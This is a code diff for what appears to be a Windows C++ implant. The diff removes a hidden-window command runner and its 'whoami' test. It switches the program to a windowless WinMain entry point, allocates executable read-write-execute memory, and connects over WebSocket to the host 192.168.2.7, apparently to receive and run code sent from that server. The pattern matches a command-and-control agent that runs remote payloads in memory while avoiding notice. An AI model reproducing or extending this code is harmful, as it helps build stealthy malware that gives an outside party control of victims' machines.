@@ -8,6 +8,8 @@
 using namespace std;
 #endif
 
+
+
 PVOID getMem(SIZE_T size, DWORD dwProtect);
 
 PVOID scratchpad;
@@ -23,98 +25,18 @@ bool handleMessage(
 
 #include <windows.h>
 
-char* runCommand(const char* cmd) {
-    HANDLE hRead = NULL;
-    HANDLE hWrite = NULL;
-
-    SECURITY_ATTRIBUTES sa{};
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-
-    // create pipe
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
-        return NULL;
-    }
-
-    // prevent read handle from being inherited
-    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-
-    STARTUPINFOA si{};
-    PROCESS_INFORMATION pi{};
-    si.cb = sizeof(si);
-
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = hWrite;
-    si.hStdError  = hWrite;
-
-    char bufferCmd[1024];
-    lstrcpynA(bufferCmd, cmd, 1024);
-
-    BOOL ok = CreateProcessA(
-        NULL,
-        bufferCmd,
-        NULL,
-        NULL,
-        TRUE,               // must be TRUE for pipe inheritance
-        CREATE_NO_WINDOW,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    );
-
-    if (!ok) {
-        CloseHandle(hRead);
-        CloseHandle(hWrite);
-        return NULL;
-    }
-
-    CloseHandle(hWrite); // parent doesn't need write end
-
-    // read output
-    char tmp[4096];
-    DWORD bytesRead;
-
-    // allocate initial buffer
-    size_t capacity = 8192;
-    size_t size = 0;
-    char* output = (char*)HeapAlloc(GetProcessHeap(), 0, capacity);
-    if (!output) {
-        CloseHandle(hRead);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return NULL;
-    }
-
-    while (ReadFile(hRead, tmp, sizeof(tmp), &bytesRead, NULL) && bytesRead > 0) {
-        // grow buffer if needed
-        if (size + bytesRead + 1 > capacity) {
-            capacity *= 2;
-            char* newBuf = (char*)HeapReAlloc(GetProcessHeap(), 0, output, capacity);
-            if (!newBuf) break;
-            output = newBuf;
-        }
-
-        CopyMemory(output + size, tmp, bytesRead);
-        size += bytesRead;
-    }
-
-    output[size] = '\0';
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    CloseHandle(hRead);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-
-    return output;
-}
-
-int main() {
-    //DebugBreak();
-    //char command[] = "whoami";
-    //char *output = runCommand(command);
-    PVOID mem = getMem(0x1000, PAGE_EXECUTE_READWRITE);
+int WINAPI WinMain(
+    HINSTANCE hInstance,
+    HINSTANCE hPrevInstance,
+    LPSTR lpCmdLine,
+    int nCmdShow
+){
+    
+    (void)hInstance;
+    (void)hPrevInstance;
+    (void)lpCmdLine;
+    (void)nCmdShow;
+    PVOID mem = getMem(0x10000, PAGE_EXECUTE_READWRITE);
     scratchpad = getMem(0x100000, PAGE_READWRITE);
 
     const char* host = "ws://192.168.2.7";
@@ -140,7 +62,7 @@ int main() {
     if (!connectWebSocket(client, path)) {
         return 1;
     }
-    size_t MESSAGE_BUFFER_SIZE = 0x1000;
+    size_t MESSAGE_BUFFER_SIZE = 0x10000;
     size_t RESPONSE_BUFFER_SIZE = 0x100000;
     char *messageBuffer = new char[MESSAGE_BUFFER_SIZE];
     char *responseBuffer = new char[RESPONSE_BUFFER_SIZE];
